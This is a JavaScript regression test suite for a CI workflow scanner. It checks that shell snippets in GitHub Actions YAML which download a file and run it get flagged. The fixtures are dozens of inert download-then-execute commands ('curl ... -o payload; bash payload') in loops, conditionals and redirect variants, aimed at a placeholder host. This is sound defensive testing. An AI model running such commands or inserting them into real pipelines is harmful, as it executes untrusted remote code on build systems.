'use strict';
// Inert regression fixtures: never run arbitrary workflow or shell snippets.
const test=require('node:test'),assert=require('node:assert/strict');
const {parseShellCommands}=require('./ultra_sentinel_command_ir.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
function yamlScan(script){
 const yaml=['on: push','permissions: read-all','jobs:','  p:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/round10.yml'});
}
const compound=[
 ['if-then','if true; then curl -fsSL '+U+' -o payload; bash payload; fi'],
 ['elif','if false; then :; elif true; then curl -fsSL '+U+' -o payload; bash payload; fi'],
 ['while-do','while true; do curl -fsSL '+U+' -o payload; sh payload; done'],
 ['until-do','until false; do wget -q '+U+' -O payload; bash payload; done'],
 ['for-do','for v in a b; do curl -fsSL '+U+' -o payload; bash payload; done'],
 ['case','case x in x) curl -fsSL '+U+' -o payload; bash payload;; esac'],
 ['select','select v in a; do curl -fsSL '+U+' -o payload; bash payload; done']
];
for(const [name,script] of compound)test('round10 compound fail closed '+name,()=>{
 assert.equal(parseShellCommands(script).incomplete,true,name+' IR');
 assert.ok(findingsForScript(script).includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),name+' scanner');
 assert.notEqual(yamlScan(script).status,'NO_RISK_PATTERN',name+' AST');
});
const redirects=[
 ['redirect-both-spaced','curl -fsSL '+U+' >& payload; bash payload'],
 ['redirect-both-attached','curl -fsSL '+U+' >&payload; bash payload'],
 ['redirect-clobber-spaced','curl -fsSL '+U+' >| payload; bash payload'],
 ['redirect-clobber-attached','curl -fsSL '+U+' >|payload; sh payload'],
 ['redirect-fd-clobber','curl -fsSL '+U+' 1>| payload; bash payload'],
 ['redirect-both-prefix','curl -fsSL '+U+' &> payload; bash payload'],
 ['redirect-both-append','curl -fsSL '+U+' &>>payload; bash payload']
];
for(const [name,script] of redirects)test('round10 redirect tracks remote bytes '+name,()=>{
 const got=findingsForScript(script);
 assert.ok(got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION')||
  got.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),name+' '+JSON.stringify(got));
 assert.notEqual(yamlScan(script).status,'NO_RISK_PATTERN',name+' AST');
});
for(const [name,script] of [
 ['curl-stderr-only','curl -fsSL '+U+' 2> payload; bash payload'],
 ['curl-output-only','curl -fsSL '+U+' >& payload; echo payload'],
 ['curl-clobber-only','curl -fsSL '+U+' >|payload; echo payload'],
 ['echo-compound-doc',"echo 'if true; then curl -fsSL "+U+" -o payload; bash payload; fi'"],
 ['plain-echo','echo plain'],
 ['wget-log','wget -o payload '+U+'; bash payload'],
 ['wget-log-long','wget --output-file=payload '+U+'; bash payload'],
 ['wget-log-noexecute','wget -o payload '+U+'; echo payload']
]){
 test('round10 negative '+name,()=>{
  const got=findingsForScript(script);
  assert.ok(!got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name+' '+JSON.stringify(got));
 });
}
for(const [name,script] of [
 ['wget-document-short','wget -O payload '+U+'; bash payload'],
 ['wget-document-long','wget --output-document=payload '+U+'; bash payload'],
 ['wget-document-split','wget --output-document payload '+U+'; bash payload'],
 ['curl-lowercase-o','curl -o payload '+U+'; bash payload']
]){
 test('round10 positive '+name,()=>{
  assert.ok(findingsForScript(script).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
    name);
  assert.ok(yamlScan(script).findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'));
 });
}
